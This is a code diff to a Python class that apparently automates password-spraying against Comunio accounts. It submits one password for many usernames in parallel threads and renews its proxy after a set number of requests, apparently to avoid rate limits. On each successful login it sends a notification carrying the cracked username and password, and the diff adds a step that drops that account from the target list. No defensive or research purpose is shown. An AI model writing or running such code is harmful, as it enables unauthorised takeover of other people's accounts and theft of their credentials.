@@ -42,6 +42,17 @@ class Comunio(UserAccount):
         else:
             self.usernames.append(usernames)
 
+    def remove_username(self, username):
+        """ removes the given username from the usernames list
+
+        :param username: username string
+        """
+        self.logger.info("Remove username {} from list".format(username))
+        try:
+            self.usernames.remove(username)
+        except ValueError as ex:
+            self.logger.error("Could not remove the username {} from list: {}".format(username, ex))
+
     def login(self, password):
         """ requests given login data to the account
 
@@ -52,7 +63,7 @@ class Comunio(UserAccount):
 
             # check if we need a new proxy
             if self.request_counter < self.max_requests:
-                #try:
+
                 with ThreadPoolExecutor(max_workers=len(self.usernames)) as executor:
 
                     future_response = {executor.submit(self.__request_login, user, password): user for user in self.usernames}
@@ -66,10 +77,9 @@ class Comunio(UserAccount):
 
                         if statuscode == 200:
                             self.send_notification(username=user, password=password)
+                            self.remove_username(username=user)
                         if statuscode == 500:
                             self.logger.error(future.result().text)
-                #except Exception as ex:
-                #    self.logger.error(ex)
             else:
                 # raise Error to renew Proxy
                 self.request_counter = 0
